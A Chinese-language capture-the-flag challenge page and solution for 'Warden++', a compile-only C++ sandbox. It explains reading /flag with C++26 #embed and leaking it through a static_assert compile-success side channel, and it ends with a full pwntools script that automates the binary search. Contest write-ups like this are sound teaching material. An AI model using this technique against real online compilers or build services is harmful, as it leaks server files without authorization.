# [Misc] Warden++

- 命题人：Rosayxy
- 题目分值：200 分

## 题目描述

<p>你坐在潮湿幽暗的囚牢里，听着典狱长喋喋不休的训话。</p>
<blockquote>
<p>“放心，你们提交的代码<strong>只会被编译</strong>，至于编译的结果，我这个人心慈手软，倒是会告诉你们”</p>
<p>“至于代码运行嘛，那倒是遥遥无期”</p>
<p>“代码的长度也会有限制，如果把服务器 DDoS 了，你们就等着被关小黑屋吧”</p>
<p>“Flag 的地点我也告诉你们，就在根目录下的 <code>/flag</code>，但是你们并不可能把它拿到手”</p>
<p>……</p>
</blockquote>
<p>你不甘心，作为最勇敢睿智的黑客，你认为任何监牢都会有弱点，而你已经在脑海里构思出来了无限种方法。</p>
<p>这时，有一句话透过了你的耳膜：</p>
<blockquote>
<p>“哦，以及我们的防护也在更新，我们已经把 g++ 的版本更新到了 <strong>g++-15</strong>，支持 <strong>C++26 的若干 feature</strong>，你们更逃不出去了！”</p>
</blockquote>
<p>听到这句话，你微微一笑，相信自己已经找到了越狱的关键。</p>
<div class="well">
<p><strong>萌新教学：</strong></p>
<p>如下面的说明所示，本题在 <code>prob07.geekgame.pku.edu.cn</code> 主机开放了 TCP 10007 端口。
你可以点击链接启动网页终端连接题目。如果涉及难以输入的特殊字符，也可以使用命令行工具 netcat 或者 pwntools 等带 socket 通信功能的库连接到这个端口。参见 <a href="#/info/faq">FAQ：关于终端交互</a>。</p>
<p>请与这个端口上的程序交互获得 Flag。连接到题目的频率限制是 30 秒 3 次。</p>
<p>题目会要求输入个人 Token 来验证你的选手身份。点击页面底部的 “复制个人 Token” 按钮可以复制自己的 Token。网页终端会自动填入 Token。</p>
</div>
<div class="well">
<p><strong>第二阶段提示：</strong></p>
<ul>
<li>看看 <a target="_blank" rel="noopener noreferrer" href="https://en.cppreference.com/w/c/preprocessor/embed">#embed</a>。</li>
<li>你需要多次交互逐渐得到 Flag。每次提交的程序应当在 Flag 的内容满足某种条件时产生编译错误。</li>
</ul>
</div>

**[【附件：下载题目源码（wardenpp.zip）】](attachment/wardenpp.zip)**

**【终端交互：连接到题目】**

## 预期解法

本题的预期解法是分为两步：

1. 利用 C++ 26 的 `#embed` 功能，在编译期实现任意文件读取，把 `flag` 的内容读取到数组当中。
2. 对数组内容进行探测，通过编译成功与否的侧信道，泄露数组内容。

其中第二步对数组内容的探测，可以直接枚举 `flag` 数组每一个字节是否等于特定的值；更优的做法是，通过二分法，不断缩小 `flag` 数组每个字节的范围，直到可以唯一确定为止。

接着就是把对 `flag` 数组内容的判断，转化为编译成功与否，这一步可以利用 `static_assert` 特性，也可以用更传统的模板加 SFINAE 的方式。

完成以上步骤，就可以成功解出本题。代码如下：

```python
from pwn import *
context(log_level = "debug", arch = "amd64", os = "linux")

# p = process(["python3", "/app.py"])
p = remote("HOSTNAME", PORT)
p.sendline('TOKEN')
p.recvuntil("P.S Flag is at /flag on the server :)\n\n")

code_str = """
constexpr char flag[] = {
    #embed "/flag"
};
int main(){
    static_assert(flag[<<idx>>] <= <<char>>);
    return 0;
}
END
"""
flag = ""
for i in range(40):
    # 二分查找确定 flag[i]
    l, r = 32, 126
    while l < r:
        mid = (l + r) // 2
        code = code_str.replace("<<idx>>", str(i)).replace("<<char>>", str(mid))
        p.send(code)
        res = p.recv()
        log.info(f"try flag[{i}] <= {mid} ({chr(mid)})")
        log.info(res)
        # if res is empty, resend
        if b"Compilation" not in res:
            continue
        if b"Compilation Success" in res:
            r = mid
        else:
            l = mid + 1

    flag += chr(l)
    log.success(f"flag: {flag}")
log.success(f"final flag: {flag}")

p.interactive()
```
